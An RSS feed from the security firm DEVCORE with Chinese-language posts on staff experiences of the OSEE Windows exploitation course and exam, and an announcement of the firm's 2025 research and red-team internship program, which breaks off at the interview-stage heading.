<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
        <title>DEVCORE 戴夫寇爾</title>
        <description>DEVCORE 戴夫寇爾 - 紅隊演練服務、滲透測試服務、資安教育訓練、資安顧問服務</description>
        <link>https://devco.re</link>
        <lastBuildDate>Sat, 12 Jul 2025 20:25:43 +0800</lastBuildDate>
        <pubDate>Sat, 12 Jul 2025 20:25:43 +0800</pubDate>
        <ttl>1800</ttl>
        <atom:link href="https://devco.re/rss" rel="self" type="application/rss+xml" />


        <item>
                <title>錯過五年，我終於踏進 OSEE 的世界</title>
                <description>&lt;p&gt;前面我想已經有許多篇 OSEE 心得了，多數內容應該就不再多做贅述，有興趣的同學可參考下列幾篇&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;/blog/2025/05/22/exp-401-osee-five-days-to-master-a-decade-of-knowledge/&quot;&gt;EXP-401 (OSEE)：用五天課程訓練通透十年的知識體系&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;/blog/2025/07/02/webdog-view-on-osee-advanced-windows-exploitation-from-0.1/&quot;&gt;從 Web 狗的視角看 OSEE — 從 0.1 開始的 Advanced Windows Exploitation 考試&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;/blog/2025/07/11/exp-401-course-and-second-exam-thoughts/&quot;&gt;EXP-401 課程 &amp;amp;&amp;amp; 第二次考試心得&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;

&lt;p&gt;這邊主要是以平常有在碰 Windows 的人的角度出發。老實說，大約在 5 年前就對 OSEE 這張證照略有所聞，而當時也剛好開始學一些 Windows Pwn 的相關知識，出一些 CTF 題目給大家玩玩，順便增進 Windows 知識，當時也學了一些有關 Windows Kernel 的利用技巧，不過剛開始學時也處處碰壁，花了好一段時間才慢慢學會怎麼去好好搞一個 Windows Kernel Exploit。在得知有這張證照之後，便下定決心未來某一天一定要拿到這張證照。&lt;/p&gt;

&lt;p&gt;大約在 2019 左右，打 CTF 漸漸的提不起興趣，慢慢的開始玩玩不同的東西，在過往 CTF 題目中，Windows 一直很少出現，但在真實世界中，卻是隨處可見，於是便開始了研究 Windows 這項旅程。在剛開始接觸 Windows Pwn 及 Windows Kernel 時，多數資源都偏舊，很多在 Windows 10 上就不能運作，在這一年，我花了許多時間逆向，慢慢了解 Windows 上的漏洞該怎麼去利用，也寫了&lt;a href=&quot;https://www.slideshare.net/slideshow/windows-10-nt-heap-exploitation-english-version/154467191&quot;&gt;幾個&lt;/a&gt;&lt;a href=&quot;https://speakerdeck.com/scwuaptx/windows-kernel-heap-segment-heap-in-windows-kernel-part-1&quot;&gt;教學投影片&lt;/a&gt;作為紀錄。而在 2020 年開始加入 DEVCORE 之後，每一年都會訂自己的年度目標，而 OSEE 跟在 Pwn2Own 中攻破 Windows 就一直在我的目標清單中。OSEE 這張證照很特別，一定得飛去現場上完課之後才能去考試，那時候上課地點也只有 Black Hat USA，然而 2020-2022 間，剛好就遇上疫情爆發，無法直接飛出國去上課，而我的目標也漸漸地從 Windows Kernel 的漏洞利用，轉往 Windows Kernel 漏洞挖掘。但在這兩年間，卻挖不太到漏洞，2022 也頂多在 &lt;a href=&quot;https://conf.devco.re/2024/keynote/DEVCORE-CONFERENCE-2024-Angelboy-LeakLess-Another-Leak-Way-in-Windows-Kernel-DFSC.pdf&quot;&gt;DFSC&lt;/a&gt; 上，挖到了幾個淺而易見的洞，但接下來很長一段時間就沒有產出了。這時也開始迷惘是不是不太適合挖 Windows Kernel，因為這個原因 2023 年初時，讓我更想拿到 OSEE 這張證照，想要證明自己在 Windows 上，還是有一定的能力的，不過當年可能是疫情關係，那年沒開課。很快地就來到 2024 年，OffSec 終於來到亞洲區開課了，並且在台灣有開 OSEE 課程，大幅省下了機票費，研究組的幾位夥伴也剛好有興趣就一起報名了這門課。&lt;/p&gt;

&lt;h2 id=&quot;上課&quot;&gt;上課&lt;/h2&gt;
&lt;p&gt;課程內容我就不多說了，在 &lt;a href=&quot;https://devco.re/blog/2025/05/22/exp-401-osee-five-days-to-master-a-decade-of-knowledge/&quot;&gt;EXP-401 (OSEE)：用五天課程訓練通透十年的知識體系&lt;/a&gt; 應該都有詳細介紹每一天所上課的內容，這篇只著重在個人心得方面。&lt;/p&gt;

&lt;p&gt;時間很快地就來到 2024 年 8 月，五天課上下來，不得不說，真的非常扎實，對於課程內容我想絕對對得起它的價錢。不論從課程的設計、題目及講師，都有非常高的品質。很後悔當初 2019 有機會去 Las Vegas 時，沒有去報名這門課，如果當初有先報這門課，我想在後面漏洞利用方面就不會卡太多時間，因為課程中提到了許許多多我當初在研究 Windows 漏洞利用時所遇到的問題。個人覺得上課好玩的地方，就是跟大家一起解 Extra Mile，就很像以前大家在寫 CTF 一樣，有一定的挑戰性，甚至有人為了 Coin 而整夜沒睡把它解完，不過我還是建議大家認真上課，可以節省很多看書的時間。&lt;/p&gt;

&lt;p&gt;課程內容另一個重點包括了「穩定的漏洞利用」，也非常有價值，這算是以往在打 CTF 不太會注意的事情。在現實的漏洞利用上，不論是在紅隊或是 Pwn2Own 上，通常都不允許你失敗，一旦打失敗就很有可能 BSoD 或是服務中斷，而這門課也很重視這一點，算是我在這們課中所學到最多的部分。&lt;/p&gt;

&lt;h2 id=&quot;考試&quot;&gt;考試&lt;/h2&gt;

&lt;p&gt;老實說，安排完考試後，其實還蠻擔心會不會考不過，如果平常都有在碰 Windows 還考不過，可能就是我的問題了。但剛好那段時間也在準備 OffensiveCon 演講，實在沒太多時間準備，多數還是靠這幾年玩下來的基礎來考試，另外這也是我第一次考 OffSec 系列的證照，難免也會各種擔心，會擔心我會不會看不懂題目要幹嘛，報告會不會寫太爛等等的。&lt;/p&gt;

&lt;p&gt;時間很快地就來到了 2025-05-31 05:00，時間實在不是很好，腦袋還是很昏沉的狀態，光是環境設定就弄了一小時。而題目就如&lt;a href=&quot;https://offensive-security.com/awe/AWE-Exam-Report.docx&quot;&gt;官方範例報告&lt;/a&gt;中所述，分別就是 User Land 跟 Kernel Land 的題目。由於平常都在碰 Windows Kernel，我就決定先解這題，不過因為太常碰了，一看就知道題目要做啥，雖然中間自己 Exploit 寫錯沒發現多花了一點時間，約花 3 個小時才搞定。&lt;/p&gt;

&lt;p&gt;而另外一提 User Land 的題目則相對麻煩一點，除了要 Code Execution 還要 Sandbox Escape，也必須寫出不依賴任何版本的漏洞利用，題目敘述很清楚，而題目中也會有一些引導幫助你解題，你會很清楚的知道下一步該做甚麼，只要你一步一步慢慢來就可以完成。其實這題就很像在打 CTF 題目，這題我大概花了 16 小時左右解決後，就去睡覺了。&lt;/p&gt;

&lt;p&gt;而隔天醒來後就開始寫報告了，這時候我並沒有立即結束考試，因為考試必須要一步一步截圖，所以我還是跟著昨天的步驟慢慢寫報告，截完所需要的圖，報告寫完後才結束考。由於前面有因為報告沒有過的先例，這份我寫的特別認真，也花了 16 小時寫這份報告，總頁數寫完大概有 256 頁吧。&lt;/p&gt;

&lt;p&gt;考完試之後，大概一週後就順利收到通過的通知。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250712/08cbcbee694010404a3f73dbda56c960.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;題外話，後來也和通過的同學們聊一下題目，發現原來我看錯題目了，其實&lt;strong&gt;不需要&lt;/strong&gt;寫出不依賴任何版本的漏洞利用 ……&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;題目記得看清楚一點。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;結語&quot;&gt;結語&lt;/h2&gt;

&lt;p&gt;想考五年的 OSEE 總算入手了，總算完成了一直擺在預定清單，卻一直沒有完成的項目。&lt;/p&gt;

&lt;p&gt;這幾年很常聽到大家說 OSEE 很難、很貴，實際上來說，如果平常有在打 CTF Pwn 題或對於 Binary 有一定程度了解的人，我想應該沒甚麼問題，可以直接上課，考試稍微複習一下即可。而如果平常很少碰 Binary 或漏洞利用，建議可以先學習一下 OSED 的內容，我覺得至少要會手動疊出 ROP 會比較適合一點。不過，比起考試，這門價值多數還是在課程上，如果你想學習 Windows 漏洞利用、想知道外面 APT 組織都是如何利用這些漏洞，還有看懂他們是怎麼去利用的，我想這門課應該非常適合你。&lt;/p&gt;

&lt;p&gt;而今年 DEVCORE 也有繼續推出 OSEE，機會難得，可以省下不少機票錢也不需要調時差，如果有興趣的同學可以好好把握機會，詳細內容可參考 &lt;a href=&quot;https://training.devco.re/2025&quot;&gt;https://training.devco.re/2025&lt;/a&gt;。&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2025/07/12/finally-stepping-into-the-world-of-osee-after-five-years/</link>
                <guid>https://devco.re/blog/2025/07/12/finally-stepping-into-the-world-of-osee-after-five-years</guid>
                <pubDate>Sat, 12 Jul 2025 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>EXP-401 課程 && 第二次考試心得</title>
                <description>&lt;p&gt;「&lt;a href=&quot;/blog/2025/05/22/exp-401-osee-five-days-to-master-a-decade-of-knowledge/&quot;&gt;EXP-401 (OSEE)：用五天課程訓練通透十年的知識體系&lt;/a&gt;」一文中已經將 EXP-401 課程內容作了詳細的介紹，而我就是那個解出題目、卻因因為報告不夠詳盡而被判定沒過的學員，因為上一篇文章講了很多課程內容，這篇文章比較偏向個人心得及雜項碎念。（還有購買 exam retake 的過程）&lt;/p&gt;

&lt;h2 id=&quot;心得&quot;&gt;心得&lt;/h2&gt;

&lt;p&gt;課程內容和教材就不細講了，這篇會更注重在不同領域獲得的新知。&lt;/p&gt;

&lt;p&gt;VMware 部分讓我學到對一個看起來很難的目標要怎麼去開始，先從 RPC 開始，然後了解記憶體布局，觸發漏洞並利用。&lt;/p&gt;

&lt;p&gt;Edge 部分學到兩種不同的程式語言如何去交互。&lt;/p&gt;

&lt;p&gt;Kernel 部分，如果沒有研究 Windows 核心漏洞的經驗，課程一開始會有很多不瞭解的地方。這是非常正常的，不用太擔心。所有研究員的學習曲線都是從初學者一開始使用別人的漏洞利用程式，對漏洞逐漸了解、研究的深度逐漸增加，到可以完成自己的 exploit chain，而 Windows 研究的最後一哩路就是核心漏洞利用。&lt;/p&gt;

&lt;p&gt;個人經驗而言，雖然在上課前已經考過 EXP-301（OSED），但是沒有多少 Windows Kernel 的經驗，藉由循序漸進的課程設計，會慢慢了解核心利用的有趣之處。最後了解 Kernel 結構成員後，可以成功利用漏洞或核心邏輯提權。&lt;/p&gt;

&lt;p&gt;其他優點：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;課程上提及的主題在教材上相當完整，每一個小步驟都有 Sample Code。&lt;/li&gt;
  &lt;li&gt;教材循序漸進講解重要觀念，甚至有包含思路中可能的試誤過程，讓你知道為什麼這樣做不能成功利用漏洞、哪一步可能出錯。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;其他缺點：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Edge 瀏覽器的研究跟利用停留在 Chakra 引擎，而現在的舊引擎已被 Chromium 取代。&lt;/li&gt;
  &lt;li&gt;在虛擬安全性 VBS 環境上有可解決的小問題，此問題在當時的網頁並未提及。&lt;/li&gt;
  &lt;li&gt;沒有實體的證書及卡片。在這個電腦網路化的時代，個人覺得實體印刷的證書及卡片更有紀念價值。從 &lt;a href=&quot;https://www.google.com/search?q=oscp+card&amp;amp;udm=2&amp;amp;sa=X&quot;&gt;Google&lt;/a&gt; 也能找到許多以前的照片。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;至於這門課程的適合對象，與 Nini 的感想類似，適合想挑戰自己、或想拓展知識體系的人。大型企業、公司並不一定會有了解或需要此技術的需求。但是課程學到的知識可以拓展到其他方面，如 Windows 惡意程式分析等。&lt;/p&gt;

&lt;h2 id=&quot;考試心得&quot;&gt;考試心得：&lt;/h2&gt;

&lt;p&gt;考前請再次詳閱 &lt;a href=&quot;https://help.offsec.com/hc/en-us/articles/360046458732-EXP-401-Advanced-Windows-Exploitation-OSEE-Exam-Guide&quot;&gt;Exam Guide&lt;/a&gt;。第一次考試時不知道是太過興奮還是緊張，雖然拿到兩個 proof.txt，但是因為報告不夠詳細而被判定未通過。其中以信件詢問了一下，說是報告寫的不夠詳細。自己重新檢視後，發現文件的確寫的不夠好，甚至沒注意到在報告中放了 30 頁的 nop，真是辛苦看報告的人了。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250711/daf8763106e3752f60430e3028fb2a3b.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250711/d5d967679ac1d56dc8027969575771bd.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;第一次在 OffSec 的考試中因為文件不夠完整被判定未通過試驗。後來在第二次的考試中，在沒有 30 頁 nop 下寫了三倍量的文件順利通過，體感上相對比其他 OffSec 的認證還要嚴格。&lt;/p&gt;

&lt;h2 id=&quot;retake&quot;&gt;Retake&lt;/h2&gt;

&lt;p&gt;因為第一次失敗的經驗中覺得同樣難度下能順利通過，馬上預約了第二次的考試。但是你會發現在 Buy More 中會找不到 OSEE 的考試：
&lt;img src=&quot;/assets/img/blog/20250711/0f3fc5a3bb4fedd51deaaf17bb7eda9d.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;詢問後很快於一天內收到回應，原來是要另外開通：
&lt;img src=&quot;/assets/img/blog/20250711/3afecdcee729143fec17c865c66418c6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;如果你也剛好沒通過的話，第一次重考需要直接聯絡、冷卻期是一個月，費用跟其他考試一樣 $249 美金。&lt;/p&gt;

&lt;h2 id=&quot;其他沒提到的內容&quot;&gt;其他沒提到的內容&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;這次的 EXP-401 課程已經改版了，可以參考以下新版連結。
  &lt;a href=&quot;https://manage.offsec.com/app/uploads/2025/03/AWE-Syllabus-new.pdf&quot;&gt;https://manage.offsec.com/app/uploads/2025/03/AWE-Syllabus-new.pdf&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://help.offsec.com/hc/en-us/articles/35549468971156-AI-Usage-Policy-in-OffSec-Exams&quot;&gt;OSEE 考試是唯一允許 AI 的考試。&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;extra&quot;&gt;Extra&lt;/h2&gt;

&lt;p&gt;附上真相一枚：(自己印的)
&lt;img src=&quot;/assets/img/blog/20250711/86a19bde52a9bd91384e85c26bc71fae.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250711/cc86ee81777aa149972bd573d3501331.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;各種參考連結&quot;&gt;各種參考連結&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://manage.offsec.com/app/uploads/2025/03/AWE-Syllabus-new.pdf&quot;&gt;https://manage.offsec.com/app/uploads/2025/03/AWE-Syllabus-new.pdf&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://voidsec.com/offsec-exp-401-advanced-windows-exploitation-awe-course-review/&quot;&gt;https://voidsec.com/offsec-exp-401-advanced-windows-exploitation-awe-course-review/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.richardosgood.com/posts/advanced-windows-exploitation-review-part-2/&quot;&gt;https://www.richardosgood.com/posts/advanced-windows-exploitation-review-part-2/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://spaceraccoon.dev/awe-osee-exam/&quot;&gt;https://spaceraccoon.dev/awe-osee-exam/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.manufaktur-it-training.de/post/osee-review-2023&quot;&gt;https://www.manufaktur-it-training.de/post/osee-review-2023&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://ommadawn46.medium.com/osee-exam-review-my-preparation-experience-and-insights-c518a75a5d0f&quot;&gt;https://ommadawn46.medium.com/osee-exam-review-my-preparation-experience-and-insights-c518a75a5d0f&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://fluidattacks.com/blog/osee-review/&quot;&gt;https://fluidattacks.com/blog/osee-review/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://x.com/Yunolay/status/1796714527410823217&quot;&gt;https://x.com/Yunolay/status/1796714527410823217&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://hesec.de/posts/osee-part1/&quot;&gt;https://hesec.de/posts/osee-part1/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.threads.net/@terryterry__/post/DHEXA62SW64&quot;&gt;https://www.threads.net/@terryterry__/post/DHEXA62SW64&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://x.com/terrynini38514/status/1899297719644221941&quot;&gt;https://x.com/terrynini38514/status/1899297719644221941&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.linkedin.com/posts/jaelkoh_osee-certification-conquered-do-the-activity-7227595431780700160-ZWYr&quot;&gt;https://www.linkedin.com/posts/jaelkoh_osee-certification-conquered-do-the-activity-7227595431780700160-ZWYr&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.linkedin.com/posts/kosuke-hiramatsu_osee-exam-reviewmy-preparation-experience-activity-7235308873287356417-H0EN&quot;&gt;https://www.linkedin.com/posts/kosuke-hiramatsu_osee-exam-reviewmy-preparation-experience-activity-7235308873287356417-H0EN&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://infosec.jaelkoh.com/2025/my-second-year-in-infosec-osee-the-odyssey&quot;&gt;https://infosec.jaelkoh.com/2025/my-second-year-in-infosec-osee-the-odyssey&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
                <link>https://devco.re/blog/2025/07/11/exp-401-course-and-second-exam-thoughts/</link>
                <guid>https://devco.re/blog/2025/07/11/exp-401-course-and-second-exam-thoughts</guid>
                <pubDate>Fri, 11 Jul 2025 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>DEVCORE 2025 第八屆實習生計畫</title>
                <description>&lt;p&gt;DEVCORE 長期投入資安社群，推廣駭客思維，因為我們相信，知識的分享及傳承是提升技術能力的重要養分之一。我們也自 2022 年起舉辦實習生計畫，期盼透過技術的實作解析，協助同學們掌握資安檢測及漏洞挖掘的正確觀念，至今已有眾多同學加入我們，共同創造了豐碩且亮眼的成果。&lt;/p&gt;

&lt;p&gt;我們很高興宣布，第八屆實習生計畫將於 2025 年 9 月正式登場，即日起開放報名！
延續往屆的成功經驗，本次實習生計畫依然分為兩個組別，讓同學能依據自身的興趣與專長，深入學習並精進技能：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Research 組：適合對漏洞研究充滿好奇心，想實際參與挖掘真實漏洞的同學&lt;/li&gt;
  &lt;li&gt;Red Team 組：適合對紅隊技術充滿熱忱，想透過訓練精進滲透測試技巧的同學&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;特別值得一提的是，在上一屆實習計畫中，Red Team 組因申請者表現優異，我們破例超額錄取了 6 位實習生，並看到了小組成員透過團隊協作顯著的成長與進步。因此本屆我們特別調高了錄取人數上限，鼓勵更多熱情且勇於挑戰自己的同學踴躍報名，一同加入我們的行列！&lt;/p&gt;

&lt;p&gt;如果你也對滲透測試、紅隊技術、漏洞研究充滿好奇，想在資安領域拓展視野、提升實戰能力，歡迎詳閱以下資訊並立即填寫報名表單！&lt;/p&gt;

&lt;h3 id=&quot;實習內容&quot;&gt;實習內容&lt;/h3&gt;

&lt;p&gt;本次實習分為 Research 及 Red Team 兩個組別，主要內容如下：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Research (Binary/Web)
以研究為主，在與導師確定研究標的後，分析目標架構、進行逆向工程或程式碼審查。藉由這個過程訓練自己的思路，找出可能的攻擊面與潛在的弱點。另外也會讓大家嘗試分析及撰寫過往漏洞的 Exploit，理解過去漏洞都出現在哪，體驗真實世界的漏洞都是如何利用。
    &lt;ul&gt;
      &lt;li&gt;漏洞挖掘及研究 60 %&lt;/li&gt;
      &lt;li&gt;1-day 開發 (Exploitation) 30 %&lt;/li&gt;
      &lt;li&gt;成果報告與準備 10 %&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Red Team
研究並深入學習紅隊常用技巧，熟悉實戰中會遇到的情境、語言與架構。了解常見漏洞的成因、實際利用方法、嚴苛條件下的利用策略、黑箱測試方式及各種奇技淫巧。學習後滲透時的常見限制、工具概念與原理。
    &lt;ul&gt;
      &lt;li&gt;漏洞與技巧的研究及深入學習 70 %&lt;/li&gt;
      &lt;li&gt;Lab 建置或 Bug Bounty 或漏洞挖掘 30 %&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;公司地點&quot;&gt;公司地點&lt;/h3&gt;

&lt;p&gt;台北市松山區八德路三段 32 號 13 樓&lt;/p&gt;

&lt;h3 id=&quot;實習時間&quot;&gt;實習時間&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;2025 年 9 月初到 2026 年 1 月底，共 5 個月&lt;/li&gt;
  &lt;li&gt;每週工作兩天，工作時間為 10:00 – 18:00
    &lt;ul&gt;
      &lt;li&gt;其中一天 14:00 - 18:00 必須到公司同步進度，其餘時間為遠端作業&lt;/li&gt;
      &lt;li&gt;如果居住雙北外可彈性調整同步方式，但須每個組別統一&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;招募對象&quot;&gt;招募對象&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;具有一定程度資安背景的學生，且可每週工作兩天&lt;/li&gt;
  &lt;li&gt;無其他招募限制，歷屆實習生可重複應徵&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;預計招收名額&quot;&gt;預計招收名額&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Research 組：2~3 人&lt;/li&gt;
  &lt;li&gt;Red Team 組：2~6 人&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;薪資待遇&quot;&gt;薪資待遇&lt;/h3&gt;

&lt;p&gt;每月新台幣 18,000 元（另補助部分交通費）&lt;/p&gt;

&lt;h2 id=&quot;招募條件資格與流程&quot;&gt;招募條件資格與流程&lt;/h2&gt;

&lt;h3 id=&quot;實習條件要求&quot;&gt;實習條件要求&lt;/h3&gt;

&lt;h4 id=&quot;research-binaryweb&quot;&gt;Research (Binary/Web)&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;基本漏洞利用及挖掘能力&lt;/li&gt;
  &lt;li&gt;具備研究熱誠，習慣了解技術本質&lt;/li&gt;
  &lt;li&gt;熟悉任一種 Scripting Language（如：Shell Script、Python、Ruby），並能使用腳本輔以研究&lt;/li&gt;
  &lt;li&gt;具備除錯能力，能善用 Debugger 追蹤程式流程、能重現並收斂問題&lt;/li&gt;
  &lt;li&gt;具備獨立分析開放原始碼專案的能力，能透過分析程式碼理解目標專案的架構&lt;/li&gt;
  &lt;li&gt;熟悉並理解常見的漏洞成因
    &lt;ul&gt;
      &lt;li&gt;OWASP Web Top 10&lt;/li&gt;
      &lt;li&gt;Memory Corruption&lt;/li&gt;
      &lt;li&gt;Race Condition&lt;/li&gt;
      &lt;li&gt;…&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;加分但&lt;strong&gt;非必要&lt;/strong&gt;條件
    &lt;ul&gt;
      &lt;li&gt;CTF 比賽經驗&lt;/li&gt;
      &lt;li&gt;pwnable.tw 成績&lt;/li&gt;
      &lt;li&gt;有公開的技術 blog/slide、write-ups 或是演講&lt;/li&gt;
      &lt;li&gt;精通 IDA Pro 或 Ghidra&lt;/li&gt;
      &lt;li&gt;熟悉任一種網頁程式語言或框架（如：PHP、ASP.NET、Express.js），具備可以建立完整網頁服務的能力&lt;/li&gt;
      &lt;li&gt;理解 &lt;a href=&quot;https://portswigger.net/web-security/all-materials&quot;&gt;PortSwigger Web Security Academy&lt;/a&gt; 中的安全議題&lt;/li&gt;
      &lt;li&gt;獨立挖掘過 0-day 漏洞，或分析過 1-day 的經驗&lt;/li&gt;
      &lt;li&gt;具備下列其中之一經驗
        &lt;ul&gt;
          &lt;li&gt;Web Application Exploit&lt;/li&gt;
          &lt;li&gt;Kernel Exploit&lt;/li&gt;
          &lt;li&gt;Windows Exploit&lt;/li&gt;
          &lt;li&gt;Browser Exploit&lt;/li&gt;
          &lt;li&gt;Bug Bounty&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;red-team&quot;&gt;Red Team&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;必要條件
    &lt;ul&gt;
      &lt;li&gt;熟悉 OWASP Web Top 10&lt;/li&gt;
      &lt;li&gt;理解 &lt;a href=&quot;https://portswigger.net/web-security/all-materials&quot;&gt;PortSwigger Web Security Academy&lt;/a&gt; 中所有的安全議題或已完成所有 Lab&lt;/li&gt;
      &lt;li&gt;理解計算機網路的基本概念&lt;/li&gt;
      &lt;li&gt;熟悉任一種網頁程式開發方式（如：PHP、ASP.NET、JSP），具備可以建立完整網頁服務的能力&lt;/li&gt;
      &lt;li&gt;熟悉任一種 Scripting Language（如：Shell Script、Python、Ruby），並能使用腳本輔以研究&lt;/li&gt;
      &lt;li&gt;具備除錯能力，能善用 Debugger 追蹤程式流程、能重現並收斂問題&lt;/li&gt;
      &lt;li&gt;具備可以建置、設定常見伺服器（如：Nginx、Apache、Tomcat、IIS、Active Directory）及作業系統（如：Linux、Windows）的能力&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;加分但&lt;strong&gt;非必要&lt;/strong&gt;條件
    &lt;ul&gt;
      &lt;li&gt;曾經獨立挖掘過 0-day 漏洞&lt;/li&gt;
      &lt;li&gt;曾經獨立分析過已知漏洞並能撰寫 1-day Exploit&lt;/li&gt;
      &lt;li&gt;曾經於 CTF 比賽中擔任出題者並建置過題目&lt;/li&gt;
      &lt;li&gt;擁有 OSCP 證照或同等能力之證照&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;應徵流程&quot;&gt;應徵流程&lt;/h3&gt;

&lt;p&gt;本次甄選一共分為二個階段：&lt;/p&gt;

&lt;h4 id=&quot;第一階段書面審查&quot;&gt;第一階段：書面審查&lt;/h4&gt;

&lt;p&gt;第一階段為書面審查，會需要審查下列兩個項目&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;履歷內容&lt;/li&gt;
  &lt;li&gt;簡答題答案
    &lt;ul&gt;
      &lt;li&gt;應徵 Research 實習生：
        &lt;ul&gt;
          &lt;li&gt;題目一：漏洞重現與分析過程
            &lt;ul&gt;
              &lt;li&gt;請提出一個，你印象最深刻或感到有趣、於西元 2022 ~ 2025 年間公開的真實漏洞或攻擊鏈案例，並依自己的理解詳述說明漏洞的成因、利用條件和可以造成的影響。同時，嘗試描述如何復現此漏洞或攻擊鏈，即使無法成功復現，也請記錄研究過程。報告撰寫請參考&lt;a href=&quot;/assets/files/recruit/DEVCORE-intern_vulnerability_analysis_example.pdf&quot;&gt;範本&lt;/a&gt;，盡可能詳細，中英不限。&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;題目二：實習期間想要研究的主題
            &lt;ul&gt;
              &lt;li&gt;請提出三個可能選擇的明確主題，並簡單說明提出的理由或想完成的內容，例如：
                &lt;ul&gt;
                  &lt;li&gt;研究 OO 開源軟體，找到可 RCE 的重大風險弱點。&lt;/li&gt;
                  &lt;li&gt;研究常見的路由器，目標包括：AA-123 路由器、BB-456 無線路由器。&lt;/li&gt;
                  &lt;li&gt;研究常見的筆記平台或軟體，目標包括：XX Note、YY Note。&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;應徵 Red Team 實習生：
        &lt;ul&gt;
          &lt;li&gt;請提出兩個於西元 2022 ~ 2025 年間公開的、與 Web 攻擊面、紅隊手法、漏洞或攻擊鏈相關的技術演講，請說明為什麼挑選這些演講並解釋它們為什麼有趣。
            &lt;ul&gt;
              &lt;li&gt;請用你的理解重新以文字詳細解釋這些演講的技術細節，整理成一份 Write-up 以 PDF 格式輸出，並提供任何你覺得可以輔助或證明你理解的附加資料。&lt;/li&gt;
              &lt;li&gt;這些演講可以來自包含但不限於 Black Hat、DEF CON、OffensiveCon、POC、Zer0Con、Hexacon、HITCON、TROOPERS CONFERENCE 等會議。&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;第二階段面試&quot;&gt;第二階段：面試&lt;/h4&gt;

